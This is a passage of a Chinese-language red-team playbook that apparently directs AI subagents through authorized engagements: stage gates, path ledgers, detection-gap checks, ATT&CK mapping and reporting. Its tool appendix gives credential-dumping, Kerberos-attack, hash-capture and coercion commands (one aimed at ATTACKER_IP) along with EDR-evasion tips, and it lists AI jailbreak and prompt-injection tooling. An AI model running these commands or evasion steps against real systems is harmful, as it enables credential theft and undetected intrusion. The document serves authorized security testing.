| 报告员 | spawn | 全部 gate-pass 的 finding → 总报告+六字段+ATT&CK+评分+gap 汇总 | 只收带复核签名与 gate-pass 的条目 |

### 阶段契约与门禁（产物过 gate 才进下一阶段）

| 阶段 | 产物必需字段（落盘 `artifacts/`+`evidence-index.md`） | 通过判据 |
|---|---|---|
| 侦察 | 资产条目（主机/端口/服务）、证据引用 | 无资产或无证据引用 → 不过 |
| 突破 | 路径台账 `paths-ledger.md`（candidate/chosen/终态）、已验证 finding（可复现 PoC/请求包）、复核记录 | 无 chosen_path 或无已验证 finding → 不过；结构校验走 stage_gate breach |
| 横向 | 横向路径证据、范围合规标注 | 无已验证突破作前置 → 不过 |
| 持久化 | persistence-registry.md 登记（含手动排除步骤） | 未登记 → 不过；登记即满足 |
| 报告 | 六字段+ATT&CK+评分+gap 汇总+持久化清单+**路径台账+阶段终态表**+**操作痕迹台账 op-traces.md** | 收到未带 gate-pass 的 finding → 退回；台账有悬空项 → 退回；op-traces 缺失或不覆盖已登记痕迹 → 退回 |

> **结构校验走运行时门禁工具**：开工门禁清单优先看 route-boost 信封（已含门禁与 canonical 文件名）；信封缺失或不确定时再调 `gates_list`（mode=attack-defense）读门禁清单与 canonical 文件名；产物齐后调 `stage_gate(mode, stage, workspace[, file])` 做结构校验（判定自动落 `<workspace>/gate-log.md`）。**校验物与标记以下表为准，不要去找插件源码文件。** 结构 PASS ≠ 全过——manual 项（语义）由复核员判定。
>
> | 阶段门 | 结构校验物（canonical 名 + 必含标记） |
> |---|---|---|
> | recon | `assets.md`（≥2 行表格）+ `evidence-index.md`（≥1 行表格） |
> | breach | `paths-ledger.md`（含标记 `candidate`、`chosen`；≥1 行、每行 ≥3 格） |
> | lateral | `file`=横向证据记录（含标记 `授权`） |
> | persistence | `persistence-registry.md`（含标记 `手动排除`；≥1 行、每行 ≥4 格） |
> | report | `file`=总评估报告（含标记 `漏洞名称`、`ATT&CK`、`detection gap`、`持久化清单`、`路径台账`、`阶段终态`）+ `op-traces.md`（含标记 `shell 地址`、`ssh 密钥`、`创建的用户`；≥1 行、每行 ≥4 格） |

### 覆盖终态规则（防「选了第一条路走到黑」）

- **候选路径台账**：路径规划员的每条 candidate_path 都有终态，三选一：
  `走通（有已验证 finding）/ 失败（附原因）/ 未尝试（附理由：优先级让位/范围外）`；
  走通的路径标注**链级 L1-L5**（见「验证与评分」节）。chosen_path 失败必须回看台账选下一条或回侦察，**不得静默收兵**；
  「全部候选路径失败」触发 claude 升级判据（见下）的前提是台账无未尝试项。
- **阶段终态表**：五个阶段每阶段终态 = `执行（有产物）/ 不适用（附原因：如纯 Web
  任务无横向面）/ 未执行（附原因与用户知情）`——跳过任何阶段都要有交代，
  与防跳步六层互为表里（六层防「没过门就进」，终态表防「该进的没进」）。
- **detection gap 三终态**：每个关键 finding 的防御验证判定 = `检测到（附手段+响应时间）/
  未检测到（gap）/ 无法评估（附原因：无日志权限/目标侧未反馈）`——禁止留空，
  「无法评估」单独汇总并列入待目标侧确认，不冒充 gap。
- **ATT&CK 覆盖度表**（对齐 refs/defense/attack-mapping-analysis）：走过的战术/技术
  与**没走的+原因**都登记——评估的完整性证明与复测基线。

- **AttackAtlas 图谱联动（覆盖台账的 UI 面）**：「AttackAtlas」标签页按本手册作战链展示——三战场分区（外网打点/内网横向/登记收尾）× 19 战术列 × 五阶段带 × 四形态（外网/内网/域/AI 应用）。
- **任务口径（用户指定优先）**：用户显式指定测试范围（如「测 SQL 注入和 XSS」）时，指定项为最高优先级——只执行指定项并逐项回写点亮（图谱终态），未指定项不补测不欠账，转全流程须用户明示；用户未指定具体项（仅给目标/全量委托）时，按本模式全流程矩阵推进。
  候选路径台账与阶段终态落盘时同步调 `redteam_coverage_mark`（key=战术列/子项；走通=tested-found、失败附原因=tested-clear、不适用附原因=na、未尝试让位=budget-stop），阶段推进调 `redteam_coverage_stage`（s1 侦察…s5 报告）；
  作战目标（授权范围/网段/域）调 `redteam_atlas_target` 登记，多目标终态带 target 参数逐目标回写。双击战术列/子项=按对应章节派单（自动带目标锚定与 refs 知识手册）。

### 防跳步六层（总控纪律，模型会想抄近道，这六层让它无利可图）

1. **文本纪律**：总控每阶段转换前，在对话中显式列出上一阶段 gate 清单核对结果再推进。
2. **角色信息裁剪**：派工 prompt 只带该角色的 playbook 章节与 refs 子集——侦察工人接触不到利用章，跳步者没有可用的知识输入（角色最小信息面策略；DSH 裁不了工具面，裁信息面）。
3. **落盘硬前置**：下一阶段每个工人的 prompt 第一条固定为「先读 `artifacts/` 上一阶段产物与 `evidence-index.md`，校验必需字段；缺任何字段立即中止并回报总控」——子代理是全新上下文，没有产物就没有输入）。
4. **复核员 gate-pass**：gate 校验并入复核员职责（`independent-review` 技能）；报告只收带 gate-pass 签名的 finding（Strix「PoC 即门禁」同构）。
5. **goal 助推**：把「当前阶段产物字段齐备」设为 session goal，由 round driver 驱动完成后再进（运行时验收实测约束力）。
6. **运行时 gate 插件（已实现 stage_gate/gates_list）**：结构校验走 stage_gate（breach 等 gate）；语义门禁归第 4 层复核员 gate-pass，从纪律变技术强制。

### claude 升级判据（对 persona 兜底链的具体化）

| 触发条件 | 动作 |
|---|---|
| 复核员之间结论不一致 | DSH 追加第三子代理仲裁，仍不一致 → 双方结论并报用户（可建议用户引入 claude 第三方） |
| 计分 finding 定稿 | DSH 独立复核一致即进报告；跨模型复核列为建议项（用户触发后升级可信级） |
| 全部候选路径失败且原因不明 | 建议（用户决定）：claude 独立评估（可能漏了什么），再决定回侦察或收口 |
| 评分或定级有争议 | DSH 追加复核；仍争议 → 按验证等级从严标注（可建议跨 harness 复核） |
| 检测 gap 判定拿不准（不确定是没检测还是没看到日志） | 建议（用户决定）：claude 分析日志可得性，必要时列入「待目标侧确认」而非妄下结论 |

### 防御证据请求清单

- 演练启动时**一次性**向用户索取防御侧证据渠道（避免每个 finding 单独等蓝队）：
  告警导出权限（SIEM/EDR 查询接口或人工导出位置）、日志收集范围、蓝队联络方式与响应 SLA。
- 渠道缺失的部分如实标注「无法评估」，detection gap 三终态（检测到/gap/无法评估）不变。

## 防御验证（detection gap）

- 每个关键发现都要回答：**目标侧检测到了吗？**（日志确认、EDR 告警、蓝队反馈）。
- 检测到：记录检测手段与响应时间；未检测到：标记为 detection gap，单列汇总。
- 与 av-evasion 模式的检测规则回馈对接：**接收** av-evasion 产出的规则候选（YARA/Sigma/遥测指标），用于 gap 判定并产出目标组织防御加固建议（方向固定：av-evasion 产出 → 本模式收口）。

## AI 应用红队（在评估范围内时）

- 对象：目标组织的 LLM 应用、智能体、MCP 生态。
- 攻击面参照 OWASP Agentic Top 10 (2026)：提示注入、越狱、工具滥用、上下文污染。
- 工具矩阵：Garak（单轮）、PyRIT（多轮）、Promptfoo（评测编排）；编排方式 = 单轮+多轮接力（Garak 单轮 → PyRIT 多轮），攻击面先读本模式 refs/ai/ 三篇。
- 发现照常走交叉复核 + 证据标准。

- **预算纪律**：Garak/PyRIT/Promptfoo 每目标默认
  ≤30 轮攻击生成，超预算收口为摘要报告，未覆盖攻击面标「未完成（预算）」。

## 验证与评分

- 评分以证据为准，禁止叙事性定级。
- 等级阶梯：分级写「能走到哪一级」（如：发现→验证→利用→影响），而非单一分数。
- **确定性信号**：「利用」及以上等级的突破/横向验证，确认必须锚定不依赖模型判断的
  布尔判据（标记回显/OOB 回调到达/对照文件字节一致/victim 标记数据被读到——分类信号表
  见 pentest-playbook「验证姿势」节，两模式同标准）。
- **利用链深度 L1-L5（与等级阶梯正交）**：每条 chosen_path 标链级——L1 单点利用；
  L2 两步串联（上一漏洞的产物突破下一环节）；L3 多步组合（3-5 步，含提权或边界突破）；
  L4 复杂链路（6 步以上，跨系统信息组合与状态规划）；L5 真实入侵级（外部入口到核心资产
  完整路径，含防御规避）。等级阶梯量**单路径深度**，链级量**多漏洞串联能力**；
  成果登记 chain 字段以 `L<级>:` 前缀标注（如 `L3: XSS窃会话→后台弱认证→上传getshell`）。
- 未验证项标「疑似」且不计入评分。

## MITRE ATT&CK 映射

- 每个 finding 映射战术/技术编号（Txxxx）；汇总出覆盖度表。
- 映射本身也要可复核：写明映射依据（行为→技术）。

## 证据收集与三件套（复用 pentest）

- 残留清单与时间线：登记到工作区 residue.md（测试创建的账号/文件/配置 + 关键操作时间戳），收尾报告并获许可后清理。
- 敏感数据最小化：凭据密钥与报告分离，展示以能证明为度。

## 战果登记（会话隔离，战果清单板式）

- 成果单位=**战果**（拿到了什么，不是漏洞报告）：真实入口点 / 数据读取成果（脱库文件路径）/
  凭据·密码本 / 哈希集(hash map) / 横向立足点 / 域控成果 / Webshell 部署 / 持久化项 / 内网资产 / 检测gap。
- 字段映射：title=战果名、type=战果类型词表、target=目标/位置、severity=权限/价值级别、
  description=内容摘要（凭据数/数据范围/权限级）、chain=获取路径、poc=利用/使用方法、evidence=证据编号。
- 状态=资产语义（待验证/有效·已验证/已失效/已交付）；复核后 `redteam_finding_update` 回写；
  失效战果（凭据轮换后）标「已失效」不删行（保留痕迹）。

## 报告模板

- 报告落盘 reports/：总体评估报告 + 逐 finding 六字段文件；消费 code-audit 静态发现时，待人工验证项汇入 pending-manual.md。
- 附加：ATT&CK 映射、证据索引（哈希+时间戳）、证据化评分与修复优先级、detection gap 汇总、
  **链级分布**（L1-L5 各几条路径——本次评估串联能力的直观读数，与等级阶梯并列呈现）。
- 修复复测闭环：修复后按原路径复测，结果回写报告。

- 局限性声明（固定行）：本报告由 AI 多 harness 协作生成（DSH=DeepSeek 主模型；复核通道=claude/codex CLI，后端随各自 CLI 配置），关键结论经 DSH 独立子代理复核后定稿输出；跨 harness 复核作为建议项由用户决定是否追加，仍可能存在模型级盲区——重大决策请结合人工判断。

## 工具手册

### 工具使用策略（总纲）

- **通道决策三原则**：①会话态保真优先（认证后交互/拦截改包给代理类通道）②输出可读性
  优先（结构化 > 裸 stdout，长输出落盘再读摘要）③最小装载成本 + OPSEC（快速探测不起
  重通道；**内网按监测姿态分叉**——装备栏 + §0.5 姿态卡）。
- **工具平面检测制（替代本机快照）**：期望工具集不声称已装，开工检测为准；tool-plane 节
  登记四列——**CLI**（command -v，多工具批量 tool-plane.sh/.ps1）/ **MCP**（自省
  `mcp__<server>__<tool>` 注册面，mcp-studio 挂载时 tools.view()；来源标 mounted |
  self-configured）/ **installed-by-agent**（收尾卸载对账清单）/ **install-failed**
  （工具+方式+原因，防重试白费）；涉 VM/沙箱任务另含「虚拟化平面」行（虚拟化与沙箱公约）。
- **探测合并（多工具时）**：批量跑 `shared/scripts/tool-plane.sh`（Windows 用 `tool-plane.ps1`；参数=本手册期望工具清单），单次紧凑表直接登记 tool-plane 节——替代逐条 `command -v` 回显。
- **攻击机条款（kali 常驻 VM，按「虚拟化与沙箱公约」）**：开工检测虚拟化平面——
  **已有运行中的 kali VM 直接启用**（配合 mcp-studio「Kali MCP」预设接工具面），并可
  ask 用户是否自动化部署 kali MCP 服务端+连接（公约例外条款，往已有系统装小服务）→
  无 kali 环境**不自动装系统**（kali 是系统不是小工具：询问用户自备/指路后再接）→
  均无则本机工具 + 已挂 MCP 走通道阶梯、覆盖度如实登记。
- **通道完整阶梯（与 pentest 同构，每级有出口有留痕）**：
  ① **已挂直接用**——CLI/MCP 两列检测到即用；
  ② **可自配 MCP 档**——白名单制（chrome-devtools 类无副作用 stdio MCP 自配+复测+用）；
    burp/yakit/kali 等**需服务型不可自配**（本机装了宿主未启动时 ask_user 请用户开，
    不自动启动 GUI/装扩展）；
  ③ **安装阀门**——CLI 工具缺失（fscan/netspy/mimikatz 类）首次 ask 是否允许自动化配置
    并调用；**批准=本会话预授权**（后续缺失默认装）；不批准=降级或遵用户建议。**失败
    最多 3 次重试**判死登记 install-failed 后直接写脚本代替；**安装位置项目/工作区目录
    优先**（venv/pip --target/工作区 tools/），仅用户指定或系统必须才装系统位；成功登记
    installed-by-agent 列；
  ④ **脚本兜底**——python3 → shell → ps1，落 scripts/ 登记后**先自测再用**；
  ⑤ **诚实降级**——不可替能力（内网重武器全缺时）登记覆盖度台账、收窄结论，不虚构；
  **收口卸载阀门**——报告产出后按 installed-by-agent 清单 ask 是否完全卸载（只卸 agent
  装的），不批准则保留结束。
- **跨平台（win/mac/linux）**：执行层命令按 pentest/code-audit/binary 手册 + 公约翻译；
  Windows 演练（域渗透/ad 系）用 PowerShell 系命令（BloodHound/Impacket 等有 Windows
  可用形态），证据与哈希按公约跨平台可对。
- **本模式定位**：编排者——执行层**内网工具链见本手册附录 A-2「内网攻防工具速查表」**
  （mimikatz/impacket/NetExec/responder/rubeus/certipy/evil-winrm/coercer 等的六要素卡）；
  Web/侦察类工具复用 pentest 附录，样本逆向复用 binary 附录，免杀载荷复用 av-evasion 附录。
  本手册只写**编排与评估专用**的用法 + 内网工具卡。
- 编排工具：workflow（扇出）、subagent/subagent_fork（分阶段角色）、subagent_claude_code
  （跨模型复核，用户触发）、goal（长任务追踪）、bash 后台任务（长时作业）。

### 阶段速查卡（编排 + 评估专用）

#### 演练规划

- 输出演练方案（目标/阶段/授权范围/窗口），走 plan mode 让用户批准后开工；
  方案结构读 refs/offensive/red-team-engagement.md。
- 阶段子代理分工与证据要求按 persona 五阶段纪律执行。

#### 各阶段执行（工具复用）

- **侦察**：加载 pentest-playbook，用其侦察/资产速查卡与 refs（web/api/zh 等）。
- **突破（外网打点）**：按本手册「外网打点作战流程」章打（hunter 测绘→提级序→登陆口 JS 专线）。
- **横向/提权**：读 refs/offensive/（initial-access/lateral-movement/
  privilege-escalation/active-directory-security/evasion-techniques/c2-infrastructure）；
  **横向主线按本手册「内网攻防作战流程」章打**（侦察端口策略+蜜罐甄别→服务线弱口令
  +锁定策略探测→被动凭据线（同广播域）→SSH/Windows/SMB/数据库落点线→框架 EXP→
  DevOps 与邮件·OA·VPN 高价值线→隔离突破 C→B 递进→域攻纵深分级/堡垒机·安防设备
  优先→穷尽终止；黑板四文件+操作痕迹台账全程回写）；
  **已控主机的全量收集**读 refs/zh-intranet/intranet-host-collect.md（W/L 模块库）；
  执行工具用本手册**附录 A-2 内网工具链**（非 pentest 附录——pentest 附录只有 Web/侦察工具）。
- **社工面**：refs/offensive/phishing-campaign.md、social-engineering.md（授权内）。

#### 防御验证（detection gap）

- 每个关键发现回答「目标侧检测到没」：核对日志/EDR 告警/蓝队反馈；
  「应该留下什么痕迹」读 refs/defense/（triage/forensics/timeline）反向验证。
- 检测到 → 记录手段与响应时间；未检测到 → detection gap 汇总，附检测规则建议
  （可引 av-playbook 检测侧章节产出 YARA/Sigma）。

#### AI 应用红队

- 工具矩阵（补充工具集，检测缺失时按安装请求兜底）：Garak（单轮）/ PyRIT（多轮）/ Promptfoo（评测编排）；
  攻击面与场景优先读本模式 refs/ai/（prompt-injection/jailbreak/agent-safety）；需要联动时再借 pentest/code-audit 的 refs/ai/（生态技能互通）。

#### MITRE ATT&CK 映射与评分

- 无专用 CLI：按「行为 → 战术/技术」手工映射（读 refs/offensive/ 各篇的技战术描述）；
  评分按证据化 + capability ladder（persona）；映射依据写进证据索引。

### 附录 A：编排工具速查（DSH 内置，随预设分发，无环境依赖）

| 工具 | 定位 | 用法要点 |
|---|---|---|
| workflow | 多阶段扇出 | 阶段并行、per-phase 子代理、结构化结果 |
| subagent / subagent_fork | 独立子代理 | 侦察组/验证组/横向组/报告组分工 |
| subagent_claude_code | 跨模型复核 | 建议项制（用户触发）；兜底链见 persona |
| goal | 长任务追踪 | 演练总目标跨轮续接 |
| bash 后台任务 | 长时作业 | 扫描/爆破类长任务 run_in_background |

### 附录 A-2：内网攻防工具速查表（六要素卡）

> 定位：执行层内网工具的结构化卡。**开工探测制**：不声称已装，先 `command -v`/`where` 探测并登记
> tool-plane，缺失走通道完整阶梯（已挂 → 自配 → 问装 → 脚本 → 诚实降级）。每个工具六要素 =
> 定位 / 安装 / 高频命令模板 / 输出解读 / 速率纪律 / 检测避让+证据留存。跨平台按 win/mac/linux 等价表
> 翻译（域渗透工具多为 Linux(python) + Windows(二进制) 双形态）。深度命令另见 refs 正文。

| 工具 | 定位 | 安装（批准后装项目目录/攻击机） |
|---|---|---|
| fscan | 内网综合初扫（存活/常见端口/服务识别/内置弱口令） | 官方 release 二进制（按攻击机平台） |
| mimikatz | Windows 凭证抓取（LSASS/SAM/DPAPI/票据） | 官方二进制（免杀形态另配） |
| impacket（secretsdump/psexec 等） | 域攻防瑞士军刀（DCSync/PTH/横向/中继） | `pip install impacket` |
| NetExec（nxc）/ crackmapexec | 域枚举+横向+模块执行（CME 的活跃 fork） | `pipx install netexec` |
| responder | LLMNR/NBT-NS/mDNS 欺骗 + 认证捕获 | 官方仓库（`pip install responder` 或源码） |
| rubeus | Kerberos 攻击（Roasting/票据/PKINIT） | 官方源码编译（Windows .NET） |
| certipy | ADCS 攻击（ESC 系列） | `pip install certipy-ad` |
| evil-winrm | WinRM 交互 shell（PTH/Kerberos） | `gem install evil-winrm` |
| coercer | 强制认证方法自动枚举（coercion） | `pip install coercer` |
| bloodhound(-ce) | AD 攻击路径图分析 | CE 发行包 + SharpHound 采集器 |
| DPAPI/LSASS 隐蔽工具 | pypykatz/DonPAPI/dploot/nanodump/lsassy/SharpDPAPI | 各自官方仓库（pip/源码/二进制） |

**fscan**
- 定位：内网作战流程第 0 节的初扫工具——一段内快速拿存活主机、常见端口、服务banner 与内置弱口令命中，产出定向扩散的起点清单。
- 高频命令：`./fscan -h <C段起始IP>/24`（默认即常见端口+弱口令）；`-hf targets.txt` 从文件读目标；`-nopoc` 只探测不利用；`-t <线程>` 降速。
- 输出解读：result.txt 按 `IP:端口 服务 [弱口令命中]` 分行——命中行直接进服务线（第 1 节）；未命中但服务存在的行进定向扩散队列。
- 速率纪律：`-t` 默认偏高，内网有监控嫌疑时降到 100 以下；一段一次扫描，不反复全段重扫（增量只扫新发现 IP）。
- 检测避让：需要极致隐蔽时 `-nopoc` 关闭内置利用；扫描结果与日志落项目目录 artifacts/ 作证据。
- 证据留存：result.txt 原样归档 + 关键命中行摘入 evidence-index。

**mimikatz**
- 定位：Windows 本地/域凭证全谱（logonpasswords/dcsync/sam/dpapi/票据）。
- 高频命令：`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`；`lsadump::dcsync /domain:X /user:krbtgt`；`sekurlsa::minidump lsass.dmp`；`dpapi::cred /in:<blob> /masterkey:<mk>`。
- 输出解读：`sekurlsa` 按 provider 分组——`MSV`(NT/LM 哈希) `Kerberos`(票据/密钥) `WDigest`(明文，若未禁用)。
- 速率纪律：单次抓取即可，不要反复 dump（每次 dump 都是一次 LSASS 访问风险）。
- 检测避让：基础 `sekurlsa` 最易被 EDR 拦，换隐蔽链（comsvcs/nanodump/lsassy/pypykatz，见 refs `lsass-dump-stealth`）。
- 证据留存：哈希/票据掩码 + 命令时间戳 + 产物哈希进 evidence-index。

**impacket（secretsdump / psexec）**
- 定位：DCSync、SAM/NTDS 导出、PTH 横向、NTLM 中继。
- 高频命令：`secretsdump.py DOMAIN/user:pass@TARGET`；`secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`；`secretsdump.py -just-dc DOMAIN/user@DC`；`psexec.py DOMAIN/user:pass@TARGET`。
- 输出解读：`secretsdump` 输出 `<RID>:<账号>:<LM>:<NT>:::` 哈希行 + `$MACHINE.ACC` 机器账户哈希；`-just-dc` 追加 DPAPI backupkey。
- 速率纪律：DCSync 只做一次取全量，勿反复拉取（触发 4662 告警）。
- 检测避让：用 AES Kerberos（`-k -aesKey`）代替明文口令认证；`psexec` 服务名用自定义、用后自删。
- 证据留存：哈希掩码 + 复现命令 + 目标 + 时间戳。

**NetExec（nxc）/ crackmapexec**
- 定位：域内批量枚举（共享/用户/会话）+ 模块化横向与凭据验证。
- 高频命令：`nxc smb 10.10.10.0/24 -u u -p p --shares`；`nxc smb <T> -u u -H <NTHash> -M lsassy`；`nxc winrm <T> -u u -p p -x whoami`。
- 输出解读：命中主机标注 `(Pwn3d!)`（本地管理员）；`--shares` 列出读写权限；`-M lsassy` 输出远程 LSASS 哈希表。
- 速率纪律：`--no-bruteforce` 防误爆；spray 每次少账户多密码、每账户每小时 ≤1 次防锁定；CIDR 分批。
- 检测避让：用 `-k`(Kerberos) 或 `-H`(哈希) 而非明文；避免对 DC 批量 spray。
- 证据留存：命中清单 + 哈希掩码 + 模块输出落盘。

**responder**
- 定位：内网协议欺骗（LLMNR/NBT-NS/mDNS）+ 捕获 NetNTLMv2 哈希。
- 高频命令：`sudo responder -I <网卡>`；`responder -I eth0 -wF`（关 WPAD 减噪）。
- 输出解读：`[+]` 记录捕获的 `NTLMv2-SSP Hash`（可离线 hashcat 5600 或 ntlmrelayx 中继）。
- 速率纪律：只开需要的协议，捕获即收；勿长时间全开（产生大量广播噪声）。
- 检测避让：定位单一网段、关闭 SMB/HTTP 服务器项降指纹；配合 ntlmrelayx 用 `-I` 多网卡分流。
- 证据留存：捕获哈希掩码 + 源主机 + 时间戳。

**rubeus**
- 定位：Kerberos 攻击（Kerberoast/AS-REP/票据注入/委派/PKINIT）。
- 高频命令：`Rubeus.exe kerberoast /outfile:hashes.txt`；`Rubeus.exe asreproast /outfile:asrep.txt`；`Rubeus.exe asktgt /user:x /rc4:HASH /ptt`；`Rubeus.exe harvest /interval:30`。
- 输出解读：`kerberoast` 输出 `$krb5tgs$23$*...`（hashcat 13100）；`asktgt` 成功即注入 TGT。
- 速率纪律：roasting 枚举一次性取全，勿反复 TGS-REQ（4769 告警）。
- 检测避让：`/opsec` 参数降低特征；加密类型控制（`/aes256`）避开 RC4 告警。
- 证据留存：票据哈希掩码 + 命令参数 + 时间戳。

**certipy**
- 定位：ADCS 攻击（ESC 系列枚举与利用、证书认证、Shadow Credentials）。
- 高频命令：`certipy find -u user@domain -p pass -dc-ip DC -vulnerable`；`certipy req ... -template X -upn admin@domain`；`certipy auth -pfx admin.pfx -dc-ip DC`；`certipy shadow auto ...`。
- 输出解读：`find -vulnerable` 列出命中模板与 ESC 编号；`auth` 输出恢复的 NT 哈希（`[+] Got hash for ...`）。
- 速率纪律：枚举一次性，利用按模板逐个确认，不盲打。
- 检测避让：用 `-dc-ip` 直连 DC 减少噪声；证书请求走 HTTPS 端点。
- 证据留存：命中模板 + ESC 编号 + 恢复哈希掩码。

**evil-winrm**
- 定位：WinRM 交互 shell（支持 PTH/Kerberos）。
- 高频命令：`evil-winrm -i TARGET -u user -p pass`；`evil-winrm -i TARGET -u user -H NTHash`。
- 输出解读：成功后进入 PowerShell 交互；`*Evil-WinRM* PS>` 提示符。
- 速率纪律：单会话复用，勿反复登录（4624/4648 日志）。
- 检测避让：优先 Kerberos（`-k`）或哈希，避免明文口令。
- 证据留存：命令回显落盘 + 会话时间戳。

**coercer**
- 定位：自动枚举 Windows 强制认证（coercion）方法。
- 高频命令：`coercer -u user -p pass -d domain -t TARGET --autodetect`；`coercer coerce -t TARGET -l ATTACKER_IP`。
- 输出解读：`[+]` 列出成功触发认证的 RPC 方法（PrinterBug/PetitPotam 等）。
- 速率纪律：每种方法单次触发，勿循环轰炸。
- 检测避让：选需认证的方法降低盲触发噪声；配合 ntlmrelayx 时目标端口精确。
- 证据留存：触发方法 + 捕获哈希掩码 + 时间戳。

**bloodhound(-ce)**
- 定位：AD 攻击路径图分析（ACL/委派/ADCS 边）。
- 高频命令：`SharpHound.exe -c all -d domain.com`；`bloodhound-ce-python -d domain.com -u u -p p -ns DC -c All`。
- 输出解读：JSON 图导入 CE，查最短路径到 DA（`GenericAll`/`WriteDacl`/`RBCD` 边）。
- 速率纪律：`-c DCOnly` 低权限即可，降低采集量；勿全林高频采集。
- 检测避让：用 LDAP 只读采集，单次完成；CE 本地运行。
- 证据留存：攻击路径导出 + 关键边 + 时间戳。

**DPAPI/LSASS 隐蔽工具（pypykatz / DonPAPI / dploot / nanodump / lsassy / SharpDPAPI）**
- 定位：DPAPI 全链解密 + LSASS 隐蔽 dump + 离线解析。
- 高频命令：`pypykatz lsa minidump lsass.dmp`；`DonPAPI.py domain/user:pass@target`；`dploot credentials -u u -p p -d d target`；`nanodump.exe --ssp --write lsass.dmp`；`lsassy -u u -p p -d d target`；`SharpDPAPI.exe credentials`。
- 输出解读：pypykatz 分 provider 输出哈希/票据/DPAPI masterkey；DonPAPI/dploot 输出目标机 DPAPI 凭据明文；lsassy 输出远程哈希表。
- 速率纪律：每台目标单次 dump/解密，勿反复。
- 检测避让：lsassy 远程免落地、nanodump `--ssp` 绕进程监控、pypykatz 全离线（详见 refs `lsass-dump-stealth` / `dpapi-creds`）。
- 证据留存：哈希/凭据掩码 + 工具 + 目标 + 时间戳。

### 附录 B：补充工具集（检测缺失时按安装请求兜底；安装命令按目标机平台自选）

| 工具 | 能力 | 安装方式（批准后装项目目录） |
|---|---|---|
| Garak | LLM 应用单轮攻击测试 | pip install garak |
| PyRIT | LLM 应用多轮红队框架 | pip install pyrit |
| Promptfoo | 评测编排与断言 | npm i -g promptfoo |
| attack-navigator | ATT&CK 映射可视化 | 官方发行包 |

### 附录 C：MCP 通道清单（按可自配性分两性）

**需服务型**（宿主程序须运行/扩展须加载/远端须可达——不可自配；本机已装宿主未启动时
ask_user 请用户开）：
- **kali MCP**——本模式主推重武器库（netexec/impacket 全家/evil-winrm/responder/msf/
  bloodhound_collect，kali VM 常驻，接 mcp-studio「Kali MCP」预设）；**burpsuite MCP**、
  **yakit MCP**、**js-reverse MCP** 同性。
**可自配型**（白名单制，无副作用本地 stdio MCP，自配+复测+用）：
- **chrome-devtools-mcp**——登陆口 JS 专线/浏览器侧首选。
- 产出同样遵守证据标准与速率纪律；工具名与参数以实际注册为准（不虚构）。

### 附录 C-2：能力级降级链（跨阶段复用查询）

| 能力 | 首选 | 降级 | 兜底 | 判定依据 |
|---|---|---|---|---|
| 外部测绘 | dsh-hunter | kali MCP（amass/theHarvester） | web_search/OSINT refs → 脚本 | 覆盖面 |
| 外部探测/指纹 | 快速类（curl/httpx） | kali MCP（nmap/whatweb/wafw00f） | 脚本 | 装载成本 |
| 登陆口 JS/浏览器侧 | Chrome MCP（自配档） | webdriver 消指纹链 | 静态拉 JS | 反指纹 |
| web 利用/认证后交互 | 代理类（burp/yakit MCP） | curl 带凭据 | POC 脚本 | 会话态保真 |
| 内网段发现/存活 | 姿态分叉：无监测 fscan／有监测 netspy 被动+慢速 | nmap -T2 分时段 | 脚本 | OPSEC |
| 内网横向/执行 | kali MCP（netexec/impacket 线） | 本机工具（附录 A-2） | 脚本 → 诚实降级 | — |
| 域攻 | kali MCP（bloodhound→kerberoast→secretsdump） | 本机 impacket 套件 | 手工协议 | — |
| 凭据攻击 | 姿态分叉：无监测在线爆破（过锁定闸）／有监测 Kerberoast/AS-REP 离线 | hashcat/john 离线 | 字典脚本 | OPSEC |
| 隧道/枢纽 | chisel（kali MCP/本机） | socat | proxychains → 脚本 | — |

### 附录 D：预设内参考案例库（refs/：随预设分发，无任何机器特定路径）

- **位置**：本预设目录下 `refs/`。加载本技能时你会得到本技能的 base 目录
  （SKILL.md 所在目录 = `skills/ad-playbook/`），refs/ 相对它 = `../../refs/`；
  用 read 直接读取，先读 `refs/README.md`（全量索引）；读取纪律：grep/README 索引先行 → `read` 带 offset/limit 按节读，禁止整本 read，扫描类长输出先落盘再读摘要。打包/迁移到任何机器路径都有效。

| 需求 | 读 refs/ 下文件 |
|---|---|
| 演练规划 | offensive/red-team-engagement.md |
| 突破/横向/提权/AD/C2 | offensive/ 对应各篇 |
| 规避技术 | offensive/evasion-techniques.md |
| 社工面 | offensive/phishing-campaign.md、social-engineering.md |
| 防御验证（痕迹/取证/时间线） | defense/ 七篇 |
| AI 目标攻击面 | ai/ai-prompt-injection.md、ai/ai-jailbreak-techniques.md、ai/ai-agent-safety.md |
| 内网与域攻防（中文资产） | zh-intranet/ 十三篇（host-collect 单机落点收集、recon/lateral/domain-attacks/privesc/tunneling/credential-theft/password-collection 等） |
| 2025-2026 攻防趋势 | trends/ad-trends-2025-2026.md |
